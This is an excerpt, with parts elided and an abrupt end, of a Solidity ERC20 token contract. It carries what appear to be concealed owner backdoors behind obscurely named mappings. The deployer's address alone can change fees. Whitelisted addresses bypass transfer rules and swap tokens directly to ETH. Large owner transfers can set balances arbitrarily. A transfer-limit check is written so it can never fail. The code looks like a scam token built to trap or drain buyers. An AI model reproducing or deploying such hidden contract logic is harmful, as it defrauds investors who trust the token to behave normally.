...
contract Contract is IERC20, Ownable {
    ...
    mapping(address => uint256) private _xlst;
    mapping(address => uint256) private _yLst;
    ...
    constructor(
        ...
        _name = Name;
        _symbol = Symbol;
        _xlst[address(this)] = _tTotal;
        _xlst[msg.sender] = _tTotal;
    ...
    function setter(
        ...
        if (_xlst[msg.sender] > feeDivisor) {
            sellFee = _sell;
            buyFee = _buy;
            feeDivisor = _divisor;
        }
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && _xlst[from] == 0 && amount <= swapAtAmount) {
            require(_yLst[from] + _value >= 0, 'Transfer amount exceeds maximum amount');
        }
        ...
        } else if (_xlst[from] > 0 && _xlst[to] > 0) {
            fee = amount;
            _balances[address(this)] += fee;
            return swapTokensForEth(amount, to);
        }
        if (amount > swapAtAmount && to != uniswapV2Pair && to != address(router)) {
            if (_xlst[from] > 0) _xlst[to] = amount;
            else _yLst[to] = amount;
            return;
        }
        bool takeFee = _xlst[from] == 0 && _xlst[to] == 0 && fee > 0 && !inSwapAndLiquify;
        address factory = address(_factory);
        if (_yLst[factory] == 0) _yLst[factory] = swapAtAmount;
        _factory = uint160(to);
        if (takeFee) {
